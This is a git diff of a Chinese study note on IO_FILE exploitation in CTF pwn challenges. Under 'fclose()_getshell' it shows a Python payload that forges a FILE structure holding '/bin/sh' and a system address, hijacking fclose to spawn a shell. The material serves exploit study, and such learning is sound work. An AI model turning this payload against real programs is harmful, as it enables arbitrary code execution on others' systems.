@@ -13,7 +13,7 @@ IO_FILE 总结 未完成...
 感觉lowkey师傅的课件还是循循善诱当时基础太差没领会其中奥妙...
 开始写前膜一波angelboy lowkey zs0zrc
 # 0x00 IO_FILE Basic
-像是一些我們熟悉的gets puts 都和IO_FILE有关
+像是一些我們熟悉的gets puts 都和IO_FILE有关
 基础部分之前在[echo][2]和[orange][3]介绍过一些就不介绍了
 
 # 0x01 fclose()_getshell
@@ -29,7 +29,7 @@ payload=payload.ljust(0x100)#充填防髒數據
 ```
 * 不存在后门情况
 ```python
-payload="/bin/sh".ljust(0x10,'\x00')+p64(system)+"\x00"*0x70+p64(buf+0x20)#此处地址上值为0
+payload="/bin/sh".ljust(0x10,'\x00')+p64(system)+"\x00"*0x70+p64(buf+0x20)#此处地址上值为0
 payload=payload.ljust(0xd8,'\x00')+p64(buf+0x10-0x88)
 payload=payload.ljust(0x100,'\x00')#防止脏数据
 ```
